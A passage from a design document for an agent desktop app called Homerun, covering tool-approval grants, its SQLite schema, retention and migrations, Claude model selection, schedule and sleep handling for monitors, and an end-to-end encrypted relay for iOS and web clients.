    policy again. Confirmed on the real API with Haiku and Sonnet 5
    ([item 3](spike-results.md#3-defer-and-resume-later)).
  - Not yet tested: an ungated call (for example `Read`) that streams after the
    deferred one. The alternative, if this rule proves insufficient, is to keep
    the process alive until every call is answered.
  - We track an SDK feature request for a `disable_parallel_tool_use` option.

This is what lets a scheduled run wait overnight for approval without holding a
process, a power assertion, or a concurrency slot.

- **Any surface can answer** — desktop, iOS, or web within its authority. Web
  can answer questions and `read` approvals only (§9.9).
- **First answer wins.** Resolution is a conditional update (`WHERE state =
  'pending'`); a late answer from another device gets *"Already answered on
  iPhone"*, and every surface updates live.
- **Unattended runs.** A scheduled run that needs input may wait a long time.
  Each task declares `input_timeout` and an action on expiry: `wait` (default for
  sessions; remind after a delay), `deny`, or `cancel_run` (sensible for
  monitors).
- **Answering a question never authorizes a tool.** If the answer leads the agent
  to a destructive action, that action still needs its own approval. This keeps
  questions low-authority, which matters for the web client.

**"Always allow" is narrow by design.** It creates a **grant**:

- **Scope: one task, one tool,** optionally narrowed to an argument pattern, for
  example `Bash` with `npm test`, or `WebFetch` to `api.github.com`. Never
  global, and never for all tasks.
- **For `Bash`,** a grant requires an exact command pattern (never a bare
  `Bash`), and becomes an allowlisted pattern under the tool policy (§5.5).
  Commands with shell metacharacters cannot be granted.
- **For network requests in a tainted run,** "Always allow" adds the domain to
  the task's egress allowlist.
- **Not offered for `destructive` actions.** Those are approved one at a time,
  always.
- **Not offered from notifications, or on the web.** Creating a grant needs the
  full app, on desktop or iOS, where the user can see and edit the exact pattern
  first.
- **Visible and revocable.** Each task's settings list its grants: who granted
  each one, when, and from which device. Each can be revoked.

```sql
CREATE TABLE tool_grants (
  grant_id      TEXT PRIMARY KEY,
  task_id       TEXT NOT NULL REFERENCES tasks(task_id),
  tool          TEXT NOT NULL,
  pattern       TEXT,                  -- command, domain, or path pattern; null = any use of this tool
  class         TEXT NOT NULL,         -- 'read' | 'write' | 'network'; never 'destructive'
  granted_by    TEXT NOT NULL,         -- device_id
  granted_at    INTEGER NOT NULL,
  revoked_at    INTEGER
);
```

### 5.7 Conversations

A **session is a conversation thread**. Each user message starts a run on that
thread; the run proceeds until the agent yields back to the user. Monitors write
to a thread too — but only when something changed, failed, or was missed
(§8.3) — so a user can reply to a monitor's report ("why did you flag this?")
and carry on from there.

- **One writer.** The runtime owns every thread and assigns a monotonic `seq` to
  each event. Messages sent from desktop, iPhone, and web at the same moment are
  given a single, total order. No merge logic exists anywhere.
- **One active run per thread,** enforced by a partial unique index (§6).
  Starting a run is an `INSERT` that either wins or fails on the index. When two
  devices send a message at the same moment, one message starts the run and the
  other becomes steering input for that run (next bullet). Both messages appear
  in the thread in `seq` order. Nobody gets two replies, and nobody's message is
  lost.
  If the run is `waiting_input`, the message is held and delivered together with
  the answer, and the UI points the user at the pending question.
- **Messages sent during a run** are pushed into the running query's streaming
  input. The agent sees them after its current step, so the user can steer a
  long session ("skip the tests, focus on the API") without stopping it.
- **Stop** cancels the run at the next safe point: after the current tool call
  completes, never mid-call.

---

## 6. Data model

SQLite (WAL mode) at the platform application-support path.

```sql
-- Stable identity for this installation. Exactly one row. See §12.
CREATE TABLE device (
  device_id     TEXT PRIMARY KEY,      -- uuid, generated at install
  platform      TEXT NOT NULL,
  hostname      TEXT NOT NULL,
  account_id    TEXT,                  -- null when signed out (§10.10)
  created_at    INTEGER NOT NULL
);

CREATE TABLE tasks (
  task_id       TEXT PRIMARY KEY,
  device_id     TEXT NOT NULL REFERENCES device(device_id),
  kind          TEXT NOT NULL,          -- 'session' | 'monitor'
  name          TEXT NOT NULL,
  version       INTEGER NOT NULL,       -- bumped on every edit
  spec          TEXT NOT NULL,          -- JSON: prompt, tools, model, policy
  archived_at   INTEGER
);

-- Immutable history of edits, so a run can be explained later.
CREATE TABLE task_versions (
  task_id       TEXT NOT NULL,
  version       INTEGER NOT NULL,
  spec          TEXT NOT NULL,
  created_at    INTEGER NOT NULL,
  PRIMARY KEY (task_id, version)
);

CREATE TABLE schedules (
  schedule_id   TEXT PRIMARY KEY,
  task_id       TEXT NOT NULL REFERENCES tasks(task_id),
  cron          TEXT NOT NULL,
  timezone      TEXT NOT NULL,          -- IANA, e.g. 'America/Los_Angeles'
  catchup       TEXT NOT NULL,          -- 'run_once' | 'run_all' | 'skip'
  max_catchup   INTEGER NOT NULL DEFAULT 1,
  next_fire_at  INTEGER,
  last_fired_at INTEGER,
  enabled       INTEGER NOT NULL DEFAULT 1
);

-- A conversation (§2.1). A session task has many; a monitor exactly one;
-- a chat has task_id = null.
CREATE TABLE threads (
  thread_id     TEXT PRIMARY KEY,
  task_id       TEXT REFERENCES tasks(task_id),  -- null for a one-off chat
  title         TEXT,
  last_seq      INTEGER NOT NULL DEFAULT 0,
  updated_at    INTEGER NOT NULL
);

CREATE TABLE runs (
  run_id        TEXT PRIMARY KEY,
  thread_id     TEXT NOT NULL REFERENCES threads(thread_id),
  task_id       TEXT,                   -- null for chat runs
  task_version  INTEGER,                -- what actually executed; null for chat runs
  sdk_session_id TEXT,                  -- Claude Agent SDK session this run used
  device_id     TEXT NOT NULL,
  trigger       TEXT NOT NULL,          -- 'message' | 'manual' | 'schedule' | 'catchup'
  origin_device TEXT,                   -- device that started it; null for schedule
  authority     TEXT NOT NULL,          -- 'full' | 'web_read_only' (§9.9); only ever downgraded
  scheduled_for INTEGER,
  dedupe_key    TEXT NOT NULL,          -- task_id + scheduled_for; run_id otherwise
  state         TEXT NOT NULL,          -- pending|running|waiting_input|succeeded|failed|cancelled|abandoned
  started_at    INTEGER,
  ended_at      INTEGER,
  outcome       TEXT,                   -- monitors: 'changed' | 'no_change'
  error         TEXT,
  claude_pid    INTEGER,                -- leader of the run's claude process group (§5.1); null when none
  UNIQUE (dedupe_key)                   -- prevents double-fire; see below
);

-- At most one active run per thread (§5.7).
CREATE UNIQUE INDEX one_active_run_per_thread ON runs(thread_id)
  WHERE state IN ('pending', 'running', 'waiting_input');

-- Append-only. Monotonic seq per thread. Source of truth for chat history,
-- client sync (§9.8), and crash resume (filtered by run_id).
CREATE TABLE thread_events (
  thread_id     TEXT NOT NULL,
  seq           INTEGER NOT NULL,
  run_id        TEXT,
  ts            INTEGER NOT NULL,
  type          TEXT NOT NULL,
  payload       TEXT NOT NULL,          -- JSON; large values moved to blobs
  PRIMARY KEY (thread_id, seq)
);

-- Content-addressed storage for large tool inputs and outputs (§6.1).
CREATE TABLE blobs (
  sha256        TEXT PRIMARY KEY,
  bytes         BLOB NOT NULL,
  size          INTEGER NOT NULL,
  created_at    INTEGER NOT NULL,
  expires_at    INTEGER                 -- null = keep; set by the retention policy
);

-- A monitor's saved state between runs (§8.3). Advanced only by a successful run.
CREATE TABLE monitor_state (
  task_id       TEXT PRIMARY KEY REFERENCES tasks(task_id),
  state         TEXT NOT NULL,          -- JSON, at most 64 KB
  version       INTEGER NOT NULL,       -- bumped on every write
  last_run_id   TEXT NOT NULL,
  updated_at    INTEGER NOT NULL
);

-- Backing store for the Agent SDK's sessionStore adapter (§5.3).
-- The model-facing transcript: owned by the SDK, opaque to clients.
-- thread_events is the user-facing history; the two are never mixed.
-- The SDK mirrors entries here on a best-effort basis and may send one twice,
-- so inserts use INSERT OR IGNORE against the uuid index.
CREATE TABLE sdk_transcripts (
  project_key   TEXT NOT NULL,
  session_id    TEXT NOT NULL,
  subpath       TEXT NOT NULL DEFAULT '',  -- subagent transcripts
  seq           INTEGER NOT NULL,
  uuid          TEXT,                      -- the entry's uuid; idempotency key
  entry         TEXT NOT NULL,             -- JSON, as given by the SDK
  PRIMARY KEY (project_key, session_id, subpath, seq)
);
CREATE UNIQUE INDEX sdk_transcripts_uuid
  ON sdk_transcripts(project_key, session_id, subpath, uuid)
  WHERE uuid IS NOT NULL;

-- Approvals and questions (§5.6).
CREATE TABLE input_requests (
  request_id    TEXT PRIMARY KEY,
  run_id        TEXT NOT NULL,
  kind          TEXT NOT NULL,          -- 'approval' | 'question'
  tool_call_id  TEXT,                   -- SDK tool_use id
  prompt        TEXT NOT NULL,          -- JSON: question text, choices, multi_select, allow_freeform
  state         TEXT NOT NULL,          -- pending|answered|expired|cancelled
  requested_at  INTEGER NOT NULL,
  expires_at    INTEGER,
  answered_at   INTEGER,
  response      TEXT,                   -- JSON: allow|deny|allow_always, or chosen options / text
  answered_by   TEXT                    -- device_id of the answering surface
);
```

### 6.1 Storage growth and retention

Monitors run all day, and sessions read whole web pages and files. Without a
policy, the database grows forever.

- **Token deltas are never stored.** `message.delta` is streamed to connected
  clients and discarded. Only `message.final` is persisted.
- **Large values live in `blobs`.** Any tool input or output over 4 KB is
  stored once, by hash. The event keeps `{sha256, size, preview}`, where
  `preview` is the first 500 characters. Identical content, such as the same
  page fetched every five minutes, is stored once.
- **Retention (default 30 days, adjustable to 7 or 90 days or forever, per
  task).** A daily job expires blobs referenced only by `tool.call` and
  `tool.result` events older than the window. The events remain, showing *"Full
  output expired"* with the preview, hash, and size.
- **Kept forever:** messages (`user.message`, `message.final`), approvals and
  questions with their answers, runs, and tool-call metadata (tool, class,
  arguments preview, decision, outcome). The audit trail of *what the agent did
  and who allowed it* is never pruned. Only bulky contents expire.
- **SDK transcripts** (`sdk_transcripts`) are the model's working memory, not
  history:
  - A monitor run's transcript is deleted when the run succeeds (every monitor
    run starts a fresh session, §8.3). Failed runs keep theirs for 30 days, for
    debugging.
  - A session thread idle for over 30 days has its transcript dropped. If the
    user continues it later, the runtime starts a fresh SDK session seeded with
    a summary built from the thread's `message.final` history.
- **Visible and reclaimable.** Settings shows storage used per task, with a
  "clear old outputs" button. SQLite runs with `auto_vacuum = INCREMENTAL`, so
  deleted space is actually returned to the disk.

### 6.2 Carried deliberately

**Two things are carried deliberately even though v1 is single-device**, because
retrofitting either is a painful migration and including them now is nearly free:

- **`UNIQUE(dedupe_key)`** — this earns its place on a single device. It prevents
  a catch-up sweep from colliding with a normal fire, and prevents re-firing the
  same scheduled slot after a crash and restart.
- **`thread_events` append-only with monotonic `seq`** — this is what makes
  crash resume and gap-free client sync work *today*, and would make replication
  work later.

### 6.3 Schema migrations and downgrade

The kill switch (§11) can roll users back to an older release, and that older
release may meet a database a newer release has already migrated. The policy:

- **Numbered, forward-only migrations.** A `schema_version` table records the
  current version. There are no down-migrations: they are rarely tested and so
  rarely correct.
- **Every migration is chained**, so an install of any age can upgrade.
- **Back up before migrating.** The runtime copies the database with SQLite's
  online backup API before the first migration of an upgrade. It keeps the last
  two backups.
- **Rollback window of two schema versions (expand, then contract).** A schema
  change is split across releases:
  - release N *adds* — new columns and tables, old ones left in place;
  - a later release *removes* what is no longer used.

  Each release therefore declares `min_readable_schema`: a release can safely
  open a database up to two schema versions newer than its own. A kill-switch
  rollback within that window just works, with no data loss.
- **Outside the window, refuse — never guess.** An older runtime that meets a
  database beyond its window does not start its agents. It says *"This database
  was upgraded by a newer version of Homerun"* and offers two choices:
  - update to the current version (the normal answer);
  - restore the pre-upgrade backup, stating plainly what will be lost (activity
    since the upgrade).
- **Migrations run in the runtime at startup, inside one transaction,** before
  the scheduler starts. A failed migration rolls back, and the runtime reports
  the failure without starting.

---

## 7. LLM access

### 7.1 v1: Claude only

v1 runs Claude models exclusively, through the Claude Agent SDK (§3.4). The
earlier requirement — one provider serving both Claude and GPT — is deferred to
v2 (§7.5).

### 7.2 How users connect

| Option | Who it suits | Notes |
|---|---|---|
| **Anthropic API key** | **Default.** Individuals | One key from the Anthropic Console, stored in the OS keychain and passed to the SDK per run. |
| **Amazon Bedrock** | AWS organizations | Uses the user's existing AWS credentials and billing. |
| **Google Vertex AI** | GCP organizations | As above, for GCP. |
| **Microsoft Foundry** | Azure organizations | As above, for Azure. |
| claude.ai login | — | **Not permitted** for third-party products without Anthropic's approval. |

The runtime calls the provider **directly over HTTPS**. Model traffic never
touches our relay.

**Onboarding cost.** Asking a consumer to create a Console account and paste an
API key is the largest onboarding hurdle in v1. Managed model billing ("we sell
credits") removes it, but reintroduces a model proxy and is deferred (§10.11).

### 7.3 Which model for which task

| Task type | Model | Rationale |
|---|---|---|
| **Session** (§2) | Claude Opus, with `fallbackModel` Sonnet | Long multi-step tool loops, where the frontier model earns its cost |
| **Monitor** — check step | Claude Haiku, or no model at all for rule-based checks (§8.3) | Runs constantly, almost always a no-op |
| **Monitor** — act step | Sonnet or Opus, on escalation only | Only pays when something actually changed |

### 7.4 Per-task model selection and budgets

**Model choice is per task, not global.** A monitor firing every five minutes is
about 8,600 runs a month. On Opus that is absurd; on Haiku, or with a
deterministic check, it is negligible.

**Escalation for monitors.** The cheap check runs first — rule-based with no
model, or on Haiku. Only when it reports a change does the runtime start a
second `query()` on a stronger model, passing it the check's findings (§8.3):

```jsonc
{
  "check": { "kind": "model", "model": "claude-haiku" },
  "act":   { "model": "claude-sonnet" }
}
```

**Budgets.** Per-run `maxBudgetUsd`, plus per-task and global spend caps summed
from each run's reported cost, with automatic pause when a cap is reached.
Runaway loops are a *when*, not an *if*.

**Prompt caching** is handled by the SDK against the Anthropic API directly. This
removes the earlier concern about cache fidelity through a gateway.

### 7.5 v2: multiple model families

When GPT, Gemini, or local models are needed, add a second agent engine behind
the internal interface described in §3.4. The earlier analysis still applies:

- OpenRouter as a single key for many model families;
- direct provider keys as an escape hatch;
- the Vercel AI SDK as the multi-provider loop.

Tasks would then choose an engine and a model. The scheduler, storage, protocol,
and clients do not change.

---

## 8. Scheduling

The scheduler lives in the runtime. A ticker every 15s claims due fires.

**Timezones.** Schedules store an IANA timezone and are evaluated against it, not
against device-local time — otherwise a travelling laptop silently shifts when
jobs fire.

**Daylight saving.**
- A time that does not exist (the spring-forward gap, for example 02:30) fires
  at the first valid instant after it.
- A time that occurs twice (the fall-back overlap) fires once, on its first
  occurrence.
- Interval schedules ("every 15 minutes") are measured in elapsed time and are
  unaffected.

### 8.1 Sleep — the central problem

Three mechanisms, in order of how much they actually help:

**1. Prevent sleep during an active run.** A power assertion held while a run is
in flight — `IOPMAssertionCreateWithName` (or `caffeinate -i`) on macOS,
`SetThreadExecutionState(ES_SYSTEM_REQUIRED | ES_CONTINUOUS)` on Windows.
**Neither requires admin rights.** This protects long sessions from being killed
mid-flight and is the highest-value, lowest-cost mitigation.

**2. Catch-up on wake.** Subscribe to `NSWorkspace.didWakeNotification` /
`PowerRegisterSuspendResumeNotification`. On wake (and on runtime start), compute
fires missed since `last_fired_at` and apply the schedule's `catchup` policy:

- `run_once` — collapse all missed fires into a single run *(default; correct for
  "check if anything changed")*
- `run_all` — replay each, bounded by `max_catchup`
- `skip` — record the miss, run nothing

**3. Waking the machine to run.** Scheduling a system wake (`pmset schedule
wake`, `IOPMSchedulePowerEvent`) **requires elevated privileges and a privileged
helper tool.** Deferred. v1 does not wake the machine.

### 8.2 Never fail silently

A monitor that quietly stops is worse than useless, because the user believes
they are still being watched.

Every missed or abandoned fire must produce a visible state and a notification
with a one-tap "run now." This is P0, not polish.

### 8.3 How monitors work

A monitor run is a small pipeline. Most runs stop at step 3.

```
fire → 1. load state → 2. check → 3. changed? ── no ──► record run, done
                                        │
                                       yes
                                        ▼
                         4. act (agent) → 5. save state → 6. report to thread
```

**1. Saved state.** Each monitor has an explicit JSON state of at most 64 KB in
`monitor_state` (§6). Examples: the last value seen, the hash of the last page
seen, the IDs of items already reported. It is explicit rather than agent-managed
memory, so it can be shown to the user, edited, reset, and tested.

**2. Two kinds of check.**

| Kind | How it works | Model calls | Good for |
|---|---|---|---|
| **Rule-based** | The runtime (not the agent) fetches a source, extracts a value, normalizes it, and compares it with the saved state | **None** | "This page changed", "price below $X", "new item in this feed", "CI failed" |
| **Model-based** | One Haiku `query()` with the task prompt, the saved state, and fresh observations. Returns structured output: `changed`, `evidence`, `new_state` | One cheap call | Judgment: "anything important in these new issues?" |

- **Rule-based sources:** HTTP (JSON path, CSS selector, or regex), RSS or Atom,
  a local file's hash, or a read-only Homerun tool. Comparators: changed, equals,
  above or below, new items.
- **Rule-based is the default** whenever a monitor can be expressed that way. At
  every five minutes, a rule-based monitor costs nothing. When the user describes
  a monitor in words, the setup flow proposes a rule-based check if one fits.
- **Model-based checks must return evidence** — what they compared. The evidence
  is stored with the run, so "why didn't it notice?" can be answered afterwards.
  It is the defence against the cheap model silently missing a change.

**3–4. Act only on change.** On a change, the runtime starts the act step: a
fresh `query()` on the act model, with the check's findings and the saved state.

- **Each monitor run is a fresh SDK session.** It never replays the monitor's
  thread, so context stays small forever.
- The act step runs under monitor tool policy: no `Bash`, and destructive actions
  pause for approval (§5.5).

**5. State advances only on success.** The new state is written in the same
transaction that marks the run `succeeded`. If a run fails or is abandoned, the
state does not advance, and the next run sees the same change again. A crash can
cause a change to be reported twice. It can never cause a change to be missed.

**6. The thread stays quiet.** A no-change run is recorded in `runs` with
`outcome = 'no_change'` and nothing else. It appears in the monitor's run
history, not in its chat thread. The thread only gets a message when:
- something changed, with the act step's report;
- a run failed;
- a fire was missed (§8.2).

**Daily health digest.** Silence must be distinguishable from death. Once a day,
at a time the user chooses, Homerun sends one summary covering each monitor:
- runs completed and changes found;
- fires missed, and why (for example, "Mac was asleep 1:00–7:40");
- failures;
- spend.

The digest can be turned off. Missed-fire and failure notifications (§8.2)
cannot.

### 8.4 Being upfront about sleep

On a laptop, the lid is closed much of the day. A monitor that checks every five
minutes may miss most of its fires. v1 does not hide this. It measures it, and
tells the user.

**Say it upfront.** Every monitor carries the label *"Runs while this computer
is awake"*. The schedule editor shows it next to the frequency.

**Measure coverage.** For every scheduled slot, the runtime records what
happened:
- ran;
- missed because the computer was asleep, known from the OS sleep and wake
  events (§8.1);
- missed because Homerun was not running, known from the gap between runtime
  shutdown and start.

These are rolled up per schedule per day in `schedule_coverage` (below). The
monitor's page and the daily digest (§8.3) show it plainly: *"Ran 212 of 2,016
scheduled checks this week (11%). Your Mac was asleep for most of the rest."*

**Suggest a fix when coverage is low.** If a monitor's weekly coverage falls below
50%, Homerun suggests, once and dismissibly:
- changing the macOS setting that prevents sleep on power adapter (the user's
  own OS setting, which Homerun links to but never changes);
- running Homerun on an always-on machine, such as a Mac mini or a desktop PC,
  and controlling it from the phone. Accounts already support several desktops
  per user (§10.6).

**Use the data for v2.** With the user's opt-in, anonymous coverage percentages
per monitor are reported (numbers only; no task content, no URLs). This answers
the open product question with data: if typical coverage for laptop users is
low, **hosted monitors** — monitors that watch the web and need no local
resources — move up the v2 plan (§15).

```sql
CREATE TABLE schedule_coverage (
  schedule_id        TEXT NOT NULL REFERENCES schedules(schedule_id),
  day                TEXT NOT NULL,     -- 'YYYY-MM-DD' in the schedule's timezone
  expected           INTEGER NOT NULL,
  ran                INTEGER NOT NULL,
  missed_asleep      INTEGER NOT NULL,
  missed_not_running INTEGER NOT NULL,
  PRIMARY KEY (schedule_id, day)
);
```

---

## 9. Remote access — reaching the desktop from anywhere

### 9.1 Requirement and constraints

The iOS app must work **over the internet**, not only on the local network.

Two constraints follow, and together they determine the design:

1. **The desktop is behind NAT.** It has no stable, reachable public address.
   Home routers, corporate networks, and carrier-grade NAT all block inbound
   connections.
2. **iOS suspends backgrounded apps.** A socket held open by the app will be torn
   down within seconds of backgrounding. **APNs push is the only reliable way to
   alert the user that an agent needs approval** — and APNs requires a server
   holding a signing key, which cannot be embedded in the desktop binary.

Constraint 2 is decisive. Infrastructure is unavoidable, so the question becomes
*how little* we can get away with.

### 9.2 The desktop must never listen on a public port

`homerund` has filesystem access and can execute shell commands. Exposing an
inbound listener from that process to the open internet is an unacceptable
attack surface — one authentication bug becomes remote code execution on the
user's machine.

**The desktop dials out and holds a persistent outbound connection.** Zero
inbound surface. This also sidesteps NAT entirely. It is the single most
important security property in this section, and it rules out any design based
on exposing an endpoint.

### 9.3 Options

| Option | Infra we run | User setup | Inbound port on desktop | Verdict |
|---|---|---|---|---|
| **Relay + push** | One small service | None | **None** (outbound only) | **Recommended** |
| Tailscale / WireGuard | None | Install + sign into a second app on both devices | None | Excellent tech, but we still need APNs, so it does not remove infra — it only adds user friction on top of it. |
| Cloudflare Tunnel | None | Account + domain | Effectively yes — a public HTTPS endpoint | Publishes the runtime to the internet. Violates §9.2. Still needs APNs. |
| WebRTC P2P | Signaling + TURN | None | None | Two services instead of one, TURN bandwidth costs, and painful in React Native. Worse on every axis than a relay. |

Since APNs forces a server into the design regardless, the relay is *marginal*
additional work — and it is the only option that requires nothing of the user.

**Why both devices being online is not enough.** Online is not the same as
reachable. The desktop sits behind a home or office router; a phone on cellular
sits behind carrier-grade NAT. Both can dial *out*; neither can accept a call
*in*. The relay is the rendezvous point both dial out to.

**Direct connection as a later optimization.** NAT hole-punching (ICE/STUN) can
sometimes establish a direct path — often on home networks, rarely through
carrier-grade NAT. It may be added later as a latency optimization with the relay
as fallback. It cannot replace the relay, and does not remove the need for a push
server.

### 9.4 Relay design

```
   homerund ──outbound WSS──►┌───────────┐◄──WSS── iOS app
                           │   Relay   │
                           │           │──APNs──► Apple ──► iOS
                           └───────────┘
              forwards opaque ciphertext frames
```

**End-to-end encrypted.** Pairing (§9.6) establishes static keypairs on both
devices. A Noise `KK` handshake over the relay produces an authenticated channel
with forward secrecy; frames are then AEAD-encrypted (XChaCha20-Poly1305 via
libsodium, available in both Node and React Native). **The relay sees only
ciphertext and routing metadata.** Compromising it does not expose task content,
prompts, results, or credentials.

**Two encryption modes.** The `KK` handshake is interactive: both devices must be
online to complete it. Three flows have an offline recipient by definition, so
they use a second mode:

| Mode | Used for | Handshake | Forward secrecy |
|---|---|---|---|
| **Live session** | Everything while both devices are connected | Noise `KK`, both online | Yes |
| **Sealed message** | Messages queued for an offline desktop; push payloads to the phone; answers sent from lock-screen actions | Noise `K`, one-way, to the recipient's pinned static key | **No** |

**Sealed messages.** A sealed message is encrypted to the recipient's pinned
static key and authenticated by the sender's. Only that recipient can read it,
and only a paired device can have sent it.

**No forward secrecy is the accepted cost.** If a device's private key is later
stolen, sealed messages recorded in transit could be decrypted. The exposure is
limited to queued messages and notifications, which is why expiries are short.

**Replay protection.** The relay stores sealed messages, and it is untrusted, so
it could deliver one twice or long after it was sent. Each sealed message carries
these fields **inside the authenticated ciphertext**:

- `msg_id` — random, 128-bit.
- `sender_device_id`.
- `created_at` and `expires_at`.
- For answers: the `request_id` being answered.

The recipient enforces:

1. **Expiry:** reject if `expires_at` has passed, allowing five minutes of clock
   skew.
2. **Deduplication:** reject a `msg_id` already seen. The seen-set is kept until
   the message's expiry, after which rule 1 rejects it anyway, so the set stays
   small.
3. **Answers apply once:** an answer to a request that is no longer pending is
   discarded (§5.6). Replaying an approval can never approve twice.

**Expiry defaults.**

| Message | Default expiry | On expiry |
|---|---|---|
| Instruction queued for an offline desktop | **12 hours** (adjustable in settings) | The desktop discards it. The phone shows *"Expired — not sent"* with a resend button |
| Push payload | 24 hours | The notification extension shows generic text |
| Answer from a lock-screen action | 1 hour | Discarded. The request stays pending and the user is reminded |

A copy of `expires_at` also travels in the clear envelope header. This lets the
relay drop expired frames early and tell the sender. It is an optimization only:
the recipient's check on the authenticated copy is what is enforced.

**What the relay stores:** the account and device tables in §10.7, connection
presence, and a bounded queue of undelivered sealed messages (per device: at
most 100 messages or 1 MB, until they expire). No message
content, no task definitions, no run history.

**Blind relay.** "Blind" means the relay moves messages it cannot read. It sees
who talks to whom, when, and how much — never what. It cannot modify or inject
frames either: authenticated encryption rejects anything it did not receive from
a trusted peer. It *can* drop or delay traffic; encryption does not prevent
denial of service. (This is sometimes marketed as "zero-knowledge"; we avoid the
term because in cryptography it means zero-knowledge proofs, which are unrelated.)

Relay connections are authorized with account tokens (§10.4), which is what
enables per-account rate limits and abuse control. Accounts do not weaken the
encryption: the account proves *who* is connecting; device keys prove *which
device* may read the traffic.

**Limit of the guarantee:** this protects users against a compromised *server*,
not against a malicious *client*. We ship the code that does the encrypting, so
a bad update could leak data before encryption. Code signing, staged rollout,
and the kill switch (§11) are the controls for that.

**When the desktop is offline** (asleep, shut, or no network), the relay reports
`offline, last seen <t>` to the phone. The user can still queue an instruction —
"send anyway, run when my Mac wakes" — as a sealed message the relay delivers on
reconnect. The instruction expires after 12 hours by default, so a stale
command is never acted on days later. On delivery, the desktop shows it as
*"sent 3 hours ago from iPhone"*. This turns the sleep limitation from a dead
end into a deferred action.

*Note:* waking a sleeping machine over the internet is not possible without an
always-on device on its LAN. Out of scope.

**Implementation:** Cloudflare Workers + Durable Objects — one Durable Object per
pairing group, using the WebSocket hibernation API so an idle connection costs
effectively nothing. Globally distributed, nothing to patch or scale. A small
Node service on Fly.io is an equivalent fallback. Either way this is a few
hundred lines; it must stay that way.

### 9.5 No direct same-network connection in v1

An earlier draft connected the phone **directly** to the desktop when both were
on the same Wi-Fi, found via mDNS/Bonjour. **It is cut from v1.**

- **It breaks §9.2.** The desktop would listen for incoming connections on every
  network it joins, including cafés, hotels, and conference Wi-Fi. That is
  pre-authentication attack surface on a process with shell access.
- **It costs a permission prompt.** iOS asks for "Local Network" access, which
  confuses users and is easy to deny.
- **The relay already works everywhere,** including on the same Wi-Fi. The only
  gain would be latency, typically tens of milliseconds, and staying usable
  during a relay outage.

The transport stays behind an interface, so a direct path can be added later —
restricted to networks the user marks as trusted — if measured relay latency or
outages justify it (§15).

### 9.6 Pairing by QR code

The in-person way to link a phone: scan a QR code shown on the desktop. It
carries the desktop's key directly, so it skips the matching-code comparison of
remote device linking (§10.5). Both methods produce the same pinned keys, and
both require signing in, because all phone traffic goes through the relay.

1. The runtime generates a static keypair at install. It hands the private key
   to the shell with `secrets.persist`, and the shell stores it in the keychain
   (§11). At every launch the shell restores it to the runtime with
   `secrets.set` (§5.2).
2. Desktop displays a QR code: `{device_id, static public key, one-time pairing
   code}`.
3. Phone scans, completes the handshake, and proves possession of the pairing
   code.
4. Both sides persist each other's static public key. The phone stores its
   identity key in the iOS Keychain (Secure Enclave-backed where available).
5. All later connections authenticate against those pinned keys.

**Revocation:** the desktop lists paired devices and can unpair one, which
invalidates its relay token and removes its key. Necessary for a lost phone.

### 9.7 Push notifications

**Rich content, still end-to-end encrypted.** The APNs payload is a sealed
message (§9.4), encrypted by the runtime to the phone's device key. An iOS **Notification
Service Extension** decrypts it on the phone before display, so the notification
can say *"Approve: delete 3 files in ~/Code/site?"* while Apple and our relay see
only ciphertext. The key is shared with the extension through a Keychain access
group. If decryption fails or the content exceeds APNs' 4 KB payload limit, the
notification falls back to generic text and the app fetches the details.

**Actionable notifications.** Questions with short choices and `read` / `write`
approvals can be answered from the lock screen. **`destructive` approvals always
open the app and require Face ID.** The user's iOS "Show Previews" setting
governs what appears on the lock screen.

**Answering from the lock screen.** iOS gives a notification action only a few
seconds of background time, which is too short for a WebSocket connection and a
`KK` handshake. The answer is therefore sent as a **sealed message** in a single
HTTPS POST to the relay:

- The relay acknowledges receipt, and the phone shows *"Answer sent"*, not
  *"Approved"*.
- The desktop confirms later, through the live channel or a push: *"Approved —
  run resumed"*.
- If the desktop is offline, the answer waits in the relay queue until it
  expires (one hour).

### 9.8 The iOS app: a full conversational client

The iOS app is **not** a thin remote. It must let the user:

1. **Read chat history** — every thread on each linked desktop.
2. **Answer questions** — single / multi-select and freeform (§5.6).
3. **Approve or deny permissions** requested by the agent (§5.6).
4. **Keep chatting** — send messages, steer a running session, stop a run, and
   start new sessions on a chosen desktop (§5.7).

**Sync model.** The runtime's per-thread event log (§6) is the source of truth;
the phone holds a cache.

- **Thread list:** the runtime sends summaries — title, last message, unread
  count, and whether input is pending.
- **History:** paged backwards from the newest event, so a thread opens instantly
  however long it is. History is sent as `message.final` events, not the
  thousands of token deltas that produced them.
- **Live:** the phone subscribes from its last known `seq`. Token deltas are
  coalesced into frames every ~50–100 ms to keep relay traffic sane.
- **Reconnect:** the phone sends *"thread T, I have up to seq N"*; the runtime
  sends the remainder. No gaps, no duplicates, no special cases after a network
  drop.

**When the desktop is offline** — asleep, shut, or unreachable:

- Cached history stays **readable**.
- The composer still works: messages are marked *"will send when your Mac is
  back — expires in 12 h"* and held by the relay as sealed messages (§9.4).
- Questions and approvals cannot be answered, because the paused run lives on
  the desktop. The app says so explicitly.

**At rest on the phone,** the cache is an encrypted SQLite database using iOS
Data Protection class *Complete*, with its key in the Keychain marked
`ThisDeviceOnly` (never synced to iCloud). Optional Face ID lock on open.

**Code sharing.** The iOS app is now a real chat client, so it shares more than
types: `packages/chat` holds the thread store, sync engine, event reducer, and
markdown parsing, all framework-agnostic and used by desktop, web, and iOS. Only
the view layer differs (React DOM vs React Native).

### 9.9 The web client

**The web client runs no agent.** The agent runs in `homerund` on a desktop; the
web client is a remote for it, like iOS — the same relay, the same end-to-end
encrypted protocol, and the same chat, history, and question features — but with
reduced approval authority (below).

Only three places could run an agent for a web user, and only two work:

| Where | Verdict |
|---|---|
| On the user's desktop, web as a remote | **v1.** No new backend; reuses the desktop UI almost unchanged. Requires an online desktop. |
| On our servers — a hosted `homerund` | **v2** (§15). Clients address a runtime by device identity, not location, so a hosted runtime is just another linked device. Brings back per-user sandboxes, compute cost, server-held credentials, and billing. Loses local file access; gains 24/7 monitors. |
| In the browser tab | **Rejected.** Dies when the tab closes (no schedules), no file access, and the model key would sit in page JavaScript. |

**Consequence:** in v1 a user with only a browser cannot run tasks. The web app
doubles as the front door — sign in, download the desktop app, link a device.

**Code.** The web app is the same React bundle the Tauri shell renders, with a
transport adapter: local IPC inside the desktop shell, relay inside a browser.
One UI, two transports.

**Keys.** The browser generates its device keypair with WebCrypto as a
non-extractable key stored in IndexedDB, and links through the same device
linking flow as a phone (§10.5).

**The web trust caveat.** The difference between surfaces is not connectivity —
all of them are online — but **where the running code comes from.** Desktop and
iOS only execute code whose signature they verify against a key our servers do
not hold, including over-the-air updates (§14). A browser cannot do that: a web
app is re-downloaded from our server on every page load, so a compromised server
